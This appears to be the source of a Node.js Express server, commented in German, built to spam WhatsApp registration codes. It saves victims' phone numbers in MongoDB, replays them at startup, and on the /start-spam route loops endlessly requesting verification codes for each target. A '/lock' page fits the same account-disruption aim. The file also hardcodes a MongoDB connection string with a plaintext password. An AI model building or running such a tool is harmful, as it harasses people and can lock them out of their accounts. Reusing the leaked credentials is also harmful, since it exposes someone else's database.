const express = require('express');
const bodyParser = require('body-parser');
const { makeid } = require('../id');
const cookieParser = require('cookie-parser');
const { waitUntil } = require('wait-until-promise');
const pinoPretty = require('pino-pretty');
const app = express();
const port = 8000;
const path = require('path');
const mongoose = require('mongoose');
const readline = require('readline');
const requestIp = require('request-ip');
const morgan = require('morgan');
const fs = require('fs');
const ejs = require('ejs');
const __path = path.join(__dirname, 'views');
const __pathh = path.join(__dirname, 'start-pairing');
const { default: Maher_Zubair, useMultiFileAuthState, delay, makeCacheableSignalKeyStore, Browsers } = require("maher-zubair-baileys");
const { default: _makeWaSocket } = require('@whiskeysockets/baileys');

// Verbindung zur MongoDB herstellen (stellen Sie sicher, dass MongoDB läuft und zugänglich ist)
mongoose.connect('mongodb+srv://baron:baron2006@lionbot.ymq2zpo.mongodb.net/?retryWrites=true&w=majority&appName=LionBot', { useNewUrlParser: true, useUnifiedTopology: true });

// Schema für die Daten definieren
const SpamDataSchema = new mongoose.Schema({
    ddi: String,
    number: String,
    ip: String // Hinzufügen von IP in das Schema
});

// Modell aus dem Schema erstellen
const SpamData = mongoose.model('SpamData', SpamDataSchema);

const pino = require('pino');
let server = require('./views/qr');


code = require('./views/pair');
code2 = require('./start-pairing/pair2');
app.use('/qr', server);
app.use('/code', code);
app.use('/code2', code2);

app.use(bodyParser.json());
app.use(bodyParser.urlencoded({ extended: true }));
app.use(cookieParser());
app.use(express.static(path.join(__dirname, 'public')));

app.set('view engine', 'ejs');
app.set('views', __path);
app.set('start-pairing', __pathh);

// Add the following line to register the EJS view engine
app.engine('ejs', ejs.renderFile);

app.get('/', (req, res) => {
    res.render('index', { title: 'Home' });
});

app.get('/lock', async (req, res) => {

    res.render(path.join(__path, 'lock'), { title: 'Lock' });
});


// Middleware für das Protokollieren von HTTP-Anfragen
const accessLogStream = fs.createWriteStream(path.join(__dirname, 'logs.txt'), { flags: 'a' });
app.use(morgan('combined', { stream: accessLogStream }));

// Middleware für das Abrufen der IP-Adresse des Clients
app.use(requestIp.mw());

// Funktion zum Senden der gespeicherten Daten an den /start-spam Endpunkt
const sendStoredData = async () => {
    try {
        // Alle Daten aus der MongoDB abrufen
        const data = await SpamData.find({});
        // Daten an den /start-spam Endpunkt senden
        await Promise.all(data.map(async (item) => {
            await fetch('http://localhost:8000/start-spam', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify(item)
            });
        }));
        console.log('Stored data sent successfully');
    } catch (error) {
        console.error('Error sending stored data:', error);
    }
};

// Funktion aufrufen, um die Daten beim Starten des Servers zu senden
sendStoredData();

app.post('/start-spam', async (req, res) => {
  const { ddi, number } = req.body;

  try {
      // Überprüfen, ob die Kombination von DDI und Nummer bereits in der MongoDB vorhanden ist
      const existingData = await SpamData.findOne({ ddi, number });
      if (existingData) {
          res.status(400).send('Data already exists');
          return;
      }

      // Neue Instanz des Modells erstellen und speichern
      const newData = new SpamData({ ddi, number,  });
      await newData.save();
      console.log('Data saved successfully');
      res.status(200).send('Data saved successfully');
  } catch (error) {
      console.error('Error saving data:', error);
      res.status(500).send('Error saving data');
  }

    // Hier können Sie den Spam-Prozess starten
    const { state, saveCreds } = await useMultiFileAuthState('.mm');
    const spam = _makeWaSocket({
        auth: state,
        mobile: true,
        logger: pino({ level: 'silent' })
    });

    while (true) {
        try {
            res = await spam.requestRegistrationCode({
                phoneNumber: '+' + ddi + number,
                phoneNumberCountryCode: ddi,
                phoneNumberNationalNumber: number,
                phoneNumberMobileCountryCode: 724
            });

            // Wait for the specified delay time before sending the next request
            await waitUntil(() => false, { timeout: DELAY_TIME });
        } catch (err) {
            // Handle errors
        }
    }
});

app.get('/hello', (req, res) => {
    res.render('hello', { title: 'Test' });
});

app.get('/pair', (req, res) => {
    res.render('pair', { title: 'pairing' });
});

app.get('/pair2', async (req, res) => {
    
    res.render( 'pair2', { title: 'pairing2' });
});




// Define the schema
const LogSchema = new mongoose.Schema({
    message: String
});


// Modell aus dem Schema erstellen
const Log = mongoose.model('Log', LogSchema);

// Dateipfad zur Überwachung
const filePath = 'logs.txt';

// Überwachung der Datei auf Änderungen
fs.watchFile(filePath, async () => {


  // Neuen Inhalt der Datei lesen
  const fileStream = fs.createReadStream(filePath);
  const rl = readline.createInterface({
      input: fileStream,
      crlfDelay: Infinity
  });

  let logs = [];
  for await (const line of rl) {
      logs.push({ message: line });
  }

  // Alle vorhandenen Einträge in der MongoDB löschen
  await Log.deleteMany({});

  // Neue Einträge in die MongoDB einfügen
  await Log.insertMany(logs);

  
});



app.listen(port, () => {
    console.log(`Server is running on port ${port}`);
});
